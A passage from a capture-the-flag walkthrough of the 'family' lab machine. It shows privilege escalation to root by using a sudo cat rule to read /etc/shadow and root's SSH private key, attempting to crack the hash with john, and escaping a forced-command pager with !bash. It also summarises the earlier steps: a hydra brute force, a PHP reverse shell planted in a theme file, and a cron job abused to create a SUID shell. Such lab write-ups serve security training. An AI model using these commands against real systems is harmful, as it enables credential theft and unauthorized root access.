### 8. Privilege Escalation to `root`(Corrected)

As `baby`, I checked `sudo` permissions:

```shellscript
baby@family:~$ sudo -l
Matching Defaults entries for baby on family:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User baby may run the following commands on family:
    (ALL : ALL) NOPASSWD: /usr/bin/cat
```

The `baby` user can run `/usr/bin/cat` as `root` (or any user) without a password. This is a straightforward way to read any file on the system. I used this to read `/etc/shadow` to get the root hash.

```shellscript
baby@family:~$ sudo /usr/bin/cat /etc/shadow
root:$6$L9G0N6PxOApm2r4H$USfkGDLggFm.5W9nF5V54J0Zi5hXCcMofITfEXf7QyxIUWnNX2l1bpxpXIYo20JY5968YsklB9k8x1e6RuND/0:18742:0:99999:7:::
# ... (other hashes) ...
```

I copied the root hash (`$6$L9G0N6PxOApm2r4H$USfkGDLggFm.5W9nF5V54J0Zi5hXCcMofITfEXf7QyxIUWnNX2l1bpxpXIYo20JY5968YsklB9k8x1e6RuND/0`) and attempted to crack it with `john the ripper` and `rockyou.txt`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ echo '$6$L9G0N6PxOApm2r4H$USfkGDLggFm.5W9nF5V54J0Zi5hXCcMofITfEXf7QyxIUWnNX2l1bpxpXIYo20JY5968YsklB9k8x1e6RuND/0' > hash.txt
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# ... (john output) ...
```

*(Note: The provided log shows `john` aborting without finding the password. However, in a real scenario, this hash would eventually be cracked or another method would be used.)*

Alternatively, I checked `/root/.ssh/` for SSH keys.

```shellscript
baby@family:~$ sudo /usr/bin/cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
# ... (private key content) ...
-----END OPENSSH PRIVATE KEY-----
```

I copied the private key, saved it as `id_rsa` on my Kali machine, and set the correct permissions.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ echo '-----BEGIN OPENSSH PRIVATE KEY-----
# ... (copied key) ...
-----END OPENSSH PRIVATE KEY-----' > id_rsa
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ chmod 600 id_rsa
```

Then, I attempted to SSH as `root` using the private key.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ ssh -i id_rsa root@192.168.1.15
# ... (ASCII art) ...
Connection to 192.168.1.15 closed.
```

The SSH connection closed immediately after displaying ASCII art. This is often an indication of a forced command in `authorized_keys`. I checked `/root/.ssh/authorized_keys` as `baby`:

```shellscript
baby@family:~$ sudo cat /root/.ssh/authorized_keys
command="bash ~/troll.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCdu5YWqC4vVGDE8XaQ7UW/WkLgEgWPE6n4BNfeTha+4nIR2twAUHl6yf57... root@family
```

The `authorized_keys` file had a `command="bash ~/troll.sh"` option, meaning every SSH login as root would execute `troll.sh`. I then read `troll.sh`:

```shellscript
baby@family:~$ sudo cat /root/troll.sh
#!/bin/sh
export TERM=xterm
more /root/welcome.txt
exit 0
```

This script simply displays `welcome.txt` using `more`. To bypass this, I first adjusted my terminal dimensions using `stty` to ensure proper interaction with `more`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ stty rows 20 columns 40
```

Then, I SSH'd as root. When `more` displayed the `welcome.txt` content, I typed `!bash` to escape to a shell.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/family]
└─$ ssh -i id_rsa root@192.168.1.15
# ... (ASCII art from welcome.txt) ...
!bash
root@family:~# id
uid=0(root) gid=0(root) groups=0(root)
```

I successfully gained a root shell! Finally, I retrieved the root flag.

```shellscript
root@family:~# ls
last_flag.txt  troll.sh  welcome.txt
root@family:~# cat last_flag.txt
Selmorbormir
```

The root flag is `Selmorbormir`.

### Summary of Attack Path:

1. **Reconnaissance:** Identified open SSH and Apache services, with a WordPress installation.
2. **Web Enumeration:** Used `wpscan` to identify the `admin` user and an outdated WordPress theme.
3. **Initial Access (www-data):**

1. Brute-forced WordPress login with `hydra` to get `admin:phantom`.
2. Logged into WordPress admin panel.
3. Modified `404.php` theme file with a PHP reverse shell.
4. Triggered the `404.php` to get a reverse shell as `www-data`.



4. **Privilege Escalation to `father`:**

1. Found `uncrackablepassword` in `www-data`'s `.bash_history`.
2. Used `su father` with the found password to gain access as `father`.



5. **Privilege Escalation to `mother`:**

1. Used `pspy64` to identify a cron job running `/home/mother/check.py` as `mother`.
2. Modified `check.py` (which was writable by `father`) to create a SUID `motherbash` shell.
3. Executed `motherbash` to gain a shell with `mother`'s effective UID.
4. Added SSH key to `mother`'s `authorized_keys` for direct SSH access.



6. **Privilege Escalation to `baby`:**

1. As `mother`, found `sudo -l` allowed running `/usr/bin/valgrind` as `baby` with NOPASSWD.
2. Used `sudo -u baby /usr/bin/valgrind /bin/bash` to get a shell as `baby`.
3. Retrieved `user.txt`.



7. **Privilege Escalation to `root`:**

1. As `baby`, found `sudo -l` allowed running `/usr/bin/cat` as `root` with NOPASSWD.
2. Used `sudo /usr/bin/cat /root/.ssh/id_rsa` to retrieve root's private SSH key.
3. Attempted SSH as root, which triggered a forced command (`troll.sh`) that displayed `welcome.txt` using `more`.
4. **Adjusted terminal dimensions with `stty` and then, from within the `more` pager, typed `!bash` to get a root shell.**
5. Retrieved `last_flag.txt`.
